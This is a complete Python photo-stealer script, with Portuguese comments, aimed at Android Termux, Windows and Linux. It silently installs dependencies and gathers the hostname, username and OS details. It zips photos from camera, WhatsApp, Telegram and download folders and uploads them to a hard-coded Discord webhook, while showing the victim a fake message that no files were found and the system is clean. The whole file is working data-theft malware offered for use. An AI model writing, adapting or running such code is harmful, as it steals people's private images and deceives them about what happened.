#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import platform
import socket
import getpass
from pathlib import Path
import json
import zipfile
import tempfile
import threading
from datetime import datetime
import requests
import time
import random

# Verificar e instalar dependências silenciosamente
try:
    from rich.console import Console
    from rich.progress import Progress
    from rich.panel import Panel
    from rich.table import Table
except ImportError:
    os.system("pip install rich requests > /dev/null 2>&1")
    from rich.console import Console
    from rich.progress import Progress
    from rich.panel import Panel
    from rich.table import Table

# Configurar console para modo silencioso
console = Console(quiet=True)

class PhotoStealer:
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        self.system_info = self.get_system_info()
        self.found_photos = []
        self.max_file_size = 25 * 1024 * 1024  # 25MB limite do Discord
        self.temp_dir = tempfile.mkdtemp()
        self.silent_mode = True  # Modo silencioso ativado
        
    def get_system_info(self) -> dict:
        """Coleta informações do sistema silenciosamente"""
        try:
            hostname = socket.gethostname()
            username = getpass.getuser()
            
            system_info = {
                "system": platform.system(),
                "node": hostname,
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "username": username,
                "timestamp": datetime.now().isoformat()
            }
            
            # Detecção específica do Termux
            if "com.termux" in sys.executable or "TERMUX_VERSION" in os.environ:
                system_info["environment"] = "Termux"
            elif system_info["system"] == "Linux":
                system_info["environment"] = "Linux"
            elif system_info["system"] == "Windows":
                system_info["environment"] = "Windows"
            else:
                system_info["environment"] = "Other"
                
            return system_info
        except Exception:
            return {"error": "Unknown"}

    def get_photo_paths(self) -> list:
        """Retorna os caminhos onde procurar fotos baseado no SO"""
        paths = []
        system = self.system_info.get("environment", "Unknown")
        
        if system == "Termux":
            paths = [
                "/storage/emulated/0/DCIM",
                "/storage/emulated/0/Pictures",
                "/storage/emulated/0/Download",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
                "/storage/emulated/0/Telegram/Telegram Images",
                str(Path.home() / "storage" / "shared" / "Pictures"),
                str(Path.home() / "storage" / "dcim"),
                "/sdcard/DCIM",
                "/sdcard/Pictures",
                "/storage/emulated/0/DCIM/Camera",
                "/storage/emulated/0/Pictures/Instagram",
                "/storage/emulated/0/Pictures/Screenshots",
            ]
            
        elif system == "Windows":
            user_profile = os.environ.get("USERPROFILE", "")
            paths = [
                str(Path(user_profile) / "Pictures"),
                str(Path(user_profile) / "Downloads"),
                str(Path(user_profile) / "Documents"),
                str(Path(user_profile) / "OneDrive" / "Pictures"),
                str(Path(user_profile) / "AppData" / "Local" / "Packages"),
                "C:\\Users\\Public\\Pictures",
                str(Path(user_profile) / "Pictures" / "Camera Roll"),
                str(Path(user_profile) / "Pictures" / "Screenshots"),
            ]
            
        elif system == "Linux":
            home = str(Path.home())
            paths = [
                f"{home}/Pictures",
                f"{home}/Downloads",
                f"{home}/Documents",
                f"{home}/Desktop",
                "/usr/share/wallpapers",
                f"{home}/.local/share/backgrounds",
                f"{home}/Images",
                f"{home}/photos",
            ]
        
        # Adiciona caminhos comuns adicionais
        common_paths = [
            "/storage/sdcard/DCIM",
            "/storage/sdcard/Pictures",
            "/sdcard/DCIM",
            "/sdcard/Pictures",
            "/storage/emulated/0/DCIM/Camera",
            "/storage/emulated/0/Pictures/Screenshots",
        ]
        
        paths.extend(common_paths)
        return [p for p in paths if os.path.exists(p)]

    def is_photo_file(self, filename: str) -> bool:
        """Verifica se o arquivo é uma foto"""
        photo_extensions = {
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif',
            '.webp', '.raw', '.cr2', '.nef', '.arw', '.svg', '.heic'
        }
        return Path(filename).suffix.lower() in photo_extensions

    def find_photos(self, max_photos: int = 200) -> list:
        """Encontra fotos nos diretórios do sistema silenciosamente"""
        photo_paths = self.get_photo_paths()
        found_photos = []
        
        for photo_dir in photo_paths:
            try:
                for root, dirs, files in os.walk(photo_dir):
                    for file in files:
                        if self.is_photo_file(file):
                            full_path = os.path.join(root, file)
                            try:
                                file_size = os.path.getsize(full_path)
                                if file_size <= self.max_file_size and file_size > 1024:  # Filtra arquivos muito grandes e muito pequenos
                                    found_photos.append({
                                        'path': full_path,
                                        'size': file_size,
                                        'name': file
                                    })
                                    
                                    if len(found_photos) >= max_photos:
                                        break
                            except (OSError, PermissionError):
                                continue
                    
                    if len(found_photos) >= max_photos:
                        break
                        
            except (PermissionError, OSError):
                continue
                
            if len(found_photos) >= max_photos:
                break
        
        self.found_photos = found_photos
        return found_photos

    def create_info_file(self) -> str:
        """Cria arquivo com informações do sistema e lista de fotos"""
        info = {
            "system_info": self.system_info,
            "photo_count": len(self.found_photos),
            "photos_found": [
                {
                    "path": photo['path'],
                    "size": photo['size'],
                    "name": photo['name']
                } for photo in self.found_photos[:100]  # Limita a 100 no relatório
            ],
            "scan_time": datetime.now().isoformat()
        }
        
        info_file = os.path.join(self.temp_dir, "system_info.json")
        with open(info_file, 'w', encoding='utf-8') as f:
            json.dump(info, f, indent=2, ensure_ascii=False)
            
        return info_file

    def create_photos_zip(self, max_files: int = 50) -> str:
        """Cria um ZIP com as fotos encontradas"""
        if not self.found_photos:
            return None
            
        zip_path = os.path.join(self.temp_dir, "photos.zip")
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            files_added = 0
            
            for photo in self.found_photos:
                if files_added >= max_files:
                    break
                    
                try:
                    # Usa nome relativo no ZIP para evitar paths longos
                    arcname = f"photo_{files_added + 1}_{photo['name']}"
                    zipf.write(photo['path'], arcname)
                    files_added += 1
                except (OSError, PermissionError):
                    continue
        
        return zip_path if files_added > 0 else None

    def send_to_discord(self, message: str, files: list = None):
        """Envia dados para o webhook do Discord silenciosamente"""
        try:
            payload = {
                "content": message,
                "username": "System Scanner",
                "embeds": [
                    {
                        "title": "📊 System Scan Report",
                        "color": 0x00ff00,
                        "fields": [
                            {
                                "name": "Operating System",
                                "value": f"```{self.system_info.get('environment', 'Unknown')}```",
                                "inline": True
                            },
                            {
                                "name": "Username",
                                "value": f"```{self.system_info.get('username', 'Unknown')}```",
                                "inline": True
                            },
                            {
                                "name": "Files Found",
                                "value": f"```{len(self.found_photos)}```",
                                "inline": True
                            },
                            {
                                "name": "Hostname",
                                "value": f"```{self.system_info.get('node', 'Unknown')}```",
                                "inline": False
                            }
                        ],
                        "timestamp": datetime.now().isoformat()
                    }
                ]
            }
            
            files_dict = {}
            if files:
                for i, file_path in enumerate(files):
                    if file_path and os.path.exists(file_path):
                        files_dict[f'file{i}'] = (os.path.basename(file_path), open(file_path, 'rb'))
            
            response = requests.post(self.webhook_url, 
                                   json=payload, 
                                   files=files_dict if files_dict else None,
                                   timeout=60)
            
            # Fecha os arquivos
            for file_info in files_dict.values():
                file_info[1].close()
            
            return response.status_code in [200, 204]
                
        except Exception:
            return False

    def cleanup(self):
        """Limpa arquivos temporários"""
        try:
            import shutil
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass

    def show_fake_message(self):
        """Exibe mensagem falsa para o usuário"""
        fake_console = Console()
        fake_console.print("\n[bold blue]🔍 Scanning system for media files...[/bold blue]")
        
        # Simular progresso
        for i in range(5):
            time.sleep(0.5)
            fake_console.print(f"[yellow]Scanning directories... {['│', '┤', '┘', '└', '─'][i]}[/yellow]")
        
        fake_console.print("\n[green]✓ System scan completed successfully[/green]")
        fake_console.print("[bold red]❌ No photos or sensitive files found[/bold red]")
        fake_console.print("[blue]📊 Scan Summary: 0 files matching criteria[/blue]")
        fake_console.print("\n[bold green]✅ Your system is clean and secure[/bold green]")

    def run(self, max_photos: int = 200, max_zip_files: int = 50):
        """Executa o stealer completo em modo silencioso"""
        try:
            # Mostrar mensagem falsa primeiro
            if self.silent_mode:
                self.show_fake_message()
            
            # Executar em segundo plano
            def background_task():
                # Coletar informações do sistema
                self.system_info = self.get_system_info()
                
                # Buscar fotos
                photos = self.find_photos(max_photos)
                
                if photos:
                    # Preparar arquivos
                    info_file = self.create_info_file()
                    zip_file = self.create_photos_zip(max_zip_files)
                    
                    files_to_send = [info_file]
                    if zip_file:
                        files_to_send.append(zip_file)
                    
                    # Enviar para Discord
                    message = f"🚨 **SYSTEM SCAN REPORT** 🚨\n"
                    message += f"**OS**: `{self.system_info.get('environment', 'Unknown')}`\n"
                    message += f"**User**: `{self.system_info.get('username', 'Unknown')}`\n"
                    message += f"**Photos Found**: `{len(photos)}`\n"
                    message += f"**Hostname**: `{self.system_info.get('node', 'Unknown')}`\n"
                    message += f"**Time**: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                    
                    self.send_to_discord(message, files_to_send)
                
                # Limpeza
                self.cleanup()
            
            # Executar em thread separada
            thread = threading.Thread(target=background_task)
            thread.daemon = True
            thread.start()
            
            # Manter o script rodando brevemente
            time.sleep(2)
            
        except Exception:
            self.cleanup()

def main():
    """Função principal - execução automática"""
    
    # Webhook fixo (substitua pelo seu webhook)
    WEBHOOK_URL = "https://discord.com/api/webhooks/1425044577080836228/BpIwVskxVoWoqBAaFxYJI9gVj9s1JGGamhtdC-huBcUrWWufq2-bI1EcX_QAeLfkU7q2"
    
    # Executar automaticamente
    stealer = PhotoStealer(WEBHOOK_URL)
    stealer.run(max_photos=300, max_zip_files=100)

if __name__ == "__main__":
    main()
